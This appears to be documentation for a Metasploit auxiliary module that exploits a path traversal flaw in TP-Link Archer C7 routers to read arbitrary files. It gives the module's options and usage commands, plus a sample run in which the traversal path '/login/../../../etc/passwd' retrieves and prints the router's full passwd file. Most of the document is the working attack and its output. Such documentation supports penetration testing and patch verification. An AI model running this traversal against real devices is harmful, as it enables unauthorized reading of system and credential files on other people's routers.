## Vulnerable Application

This module attempts to spider files from an archer c7 router using a known traversal
vulnerability

## Options

### FILE

This option sets what file you want to collect from the router.

### SAVE

Use this option to save the file found as loot

## Verification Steps

1. `use auxiliary/gather/tplink_archer_c7_traversal`
2. `set RHOSTS <addr>`
3. `set FILE <file>`
4. `run`

## Scenarios

### Archer C7_V1_141204_US

```
msf6 > use auxiliary/gather/tplink_archer_c7_traversal
msf6 auxiliary(gather/tplink_archer_c7_traversal) > set rhosts 192.168.0.1
rhosts => 192.168.0.1
msf6 auxiliary(gather/tplink_archer_c7_traversal) > run
[*] Running module against 192.168.0.1

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Target device 'Archer C7'
[*] Grabbing data at /login/../../../etc/passwd
[+] /etc/passwd retrieved
root:x:0:0:root:/root:/bin/sh
Admin:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/bin/sh
daemon:x:2:2:daemon:/usr/sbin:/bin/sh
adm:x:3:4:adm:/adm:/bin/sh
lp:x:4:7:lp:/var/spool/lpd:/bin/sh
sync:x:5:0:sync:/bin:/bin/sync
shutdown:x:6:11:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh
operator:x:11:0:Operator:/var:/bin/sh
nobody:x:65534:65534:nobody:/home:/bin/sh
ap71:x:500:0:Linux Usermmm:/root:/bin/sh
admin:x:500:500:admin:/home:/bin/sh
guest:x:500:500:guest:/home:/bin/sh
root:x:0:0:root:/root:/bin/sh
admin:x:500:500:admin:/tmp/dropbear:/bin/sh

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
